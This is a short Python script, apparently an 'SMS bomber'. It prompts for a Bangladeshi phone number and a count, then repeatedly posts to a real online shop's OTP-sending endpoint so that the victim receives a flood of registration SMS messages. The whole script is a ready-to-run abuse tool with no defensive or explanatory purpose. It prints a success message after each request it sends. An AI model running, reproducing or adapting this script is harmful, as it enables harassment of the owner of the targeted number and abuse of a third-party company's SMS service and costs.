#Gift By : DH Alamin Hasan
#Next a ami api diye dibo

import os
os.system("clear")
# Bold High Intensty
biblack="\033[1;90m"      # Black
bired="\033[1;91m"        # Red
bigreen="\033[1;92m"      # Green
biyellow="\033[1;93m"     # Yellow
biblue="\033[1;94m"       # Blue
bipurple="\033[1;95m"     # Purple
bicyan="\033[1;96m"       # Cyan
biehite="\033[1;97m"      # White

print (bicyan+""" gift by : DH Alamin Hasan""")
import requests
from requests.structures import CaseInsensitiveDict
number  = str(input(biehite+"Number: "))


amount = int(input("Amount       : "))



url = "https://shopup.com.bd/users/send_user_otp.json"

headers = CaseInsensitiveDict()
headers["Content-Type"] = "application/json"

data = '{"user":{"login":"88'+number+'","resend":false,"type":{"register":true}},"direct_login":true}'

for i in range(amount):
	try:
		resp = requests.post(url, headers=headers, data=data)
		
		print(bired+str (i+1)+" \033[1;94m[•] SMS Send Successful  \n")
	except:
		print (bigreen+"Update SmS Send")
